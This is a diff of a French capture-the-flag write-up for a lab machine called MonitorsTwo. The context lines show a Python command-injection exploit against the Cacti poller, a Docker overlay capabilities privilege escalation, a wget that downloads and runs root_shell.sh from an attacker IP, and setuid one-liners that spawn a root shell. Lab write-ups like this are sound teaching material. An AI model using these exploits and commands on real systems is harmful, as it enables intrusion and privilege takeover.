@@ -23,7 +23,7 @@ Host is up (0.056s latency).
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
 |   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
 |_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
@@ -62,7 +62,7 @@ def bruteForce():
         for j in range(1, 10):
             vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
             result = requests.get(vulnIdURL, headers=header)
-    
+
             if result.text != "[]":
                 # print(result.text)
                 rrdName = result.json()[0]["rrd_name"]
@@ -75,7 +75,7 @@ def bruteForce():
 def remoteCodeExecution(payload, idHost, idLocal):
     encodedPayload = urllib.parse.quote(payload)
     injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"
-    
+
     result = requests.get(injectedURL,headers=header)
     print(result.text)
 
@@ -234,7 +234,7 @@ Ce bug est présent dans le programme moby, utilisé par docker.
 Un très bon article [ici](https://www.cyberark.com/resources/threat-research-blog/how-docker-made-me-more-capable-and-the-host-less-secure) explique par le menu ce bug.
 ### Explications
 
-Linux utilise les "capacités" (capabilities) qui vont permettre à différent processus d'avoir certains pouvoirs et d'autres non.
+Linux utilise les "capacités" (capabilities) qui vont permettre à différents processus d'avoir certains pouvoirs et d'autres non.
 
 Par exemple, le programme ping a la possibilité d'utiliser des raw socket, qui ne peuvent être utilisées qu'en tant que root, mais sans tous les autres attributs liés à root.
 
@@ -282,7 +282,7 @@ groups=33(www-data)
 Guessed mode: UNCERTAIN (0)
 ```
 
-Un bug dans les overlay linux, largement utilisé par docker, permettait d'accéder à des dossiers de docker normalement inaccessibles.
+Un bug dans les overlay linux, largement utilisés par docker, permettait d'accéder à des dossiers de docker normalement inaccessibles.
 
 Si on peut créer un binaire avec des capacités de type setuid et setgid, on peut alors faire en sorte d'utiliser ce binaire afin de devenir root sur la machine.
 
@@ -306,21 +306,29 @@ int main(void)
 }
 ```
 ```bash
-gcc be_root.sh -o beroot
+gcc be_root.c -o beroot
 ```
 
 Ensuite on lui donne les capacités `setcap cap_setgid,capsetuid+eip beroot` et on l'exécute depuis l'hôte.
 
-Exploit (avec bash) :
+Exploit avec le programme:
+
 ```bash
-marcus@monitorstwo:~$ rm root_shell.sh* && wget http://10.10.14.97:4343/root_shell.sh && chmod +x root_shell.sh && ./root_shell.sh 
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp$ ./beroot
+root@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp# exit
+exit
+```
+
+Exploit avec bash et python3.8 :
+```bash
+marcus@monitorstwo:~$ rm root_shell.sh* && wget http://10.10.14.97:4343/root_shell.sh && chmod +x root_shell.sh && ./root_shell.sh
 --2023-06-13 17:40:53--  http://10.10.14.97:4343/root_shell.sh
 Connecting to 10.10.14.97:4343... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 1719 (1.7K) [application/x-sh]
 Saving to: ‘root_shell.sh’
 
-root_shell.sh                                              100%[========================================================================================================================================>]   1.68K  --.-KB/s    in 0.001s  
+root_shell.sh                                              100%[========================================================================================================================================>]   1.68K  --.-KB/s    in 0.001s
 
 2023-06-13 17:40:53 (2.88 MB/s) - ‘root_shell.sh’ saved [1719/1719]
 
@@ -337,18 +345,18 @@ Then just set the capabilities on the program :
 setcap cap_setgid,cap_setuid+eip beroot
 Other example : setcap cap_setuid+ep /usr/bin/python3.8
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash");'
-When 'chmod u+s bash' is done, press a key : 
+When 'chmod u+s bash' is done, press a key :
 /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/bin/bash: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory
 bash-5.1# whoami
 root
 bash-5.1# cd /root
 bash-5.1# ls
 cacti  root.txt
-bash-5.1# 
+bash-5.1#
 ```
 
 
-Code :
+Code du script :
 
 ```bash
 #!/usr/bin/env bash
@@ -397,14 +405,5 @@ function find_path
 is_vulnerable
 find_path
 ```
-
-Avec le programme:
-
-```bash
-marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp$ ./beroot
-root@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp# exit
-exit
-```
-
 
 Et voilà !
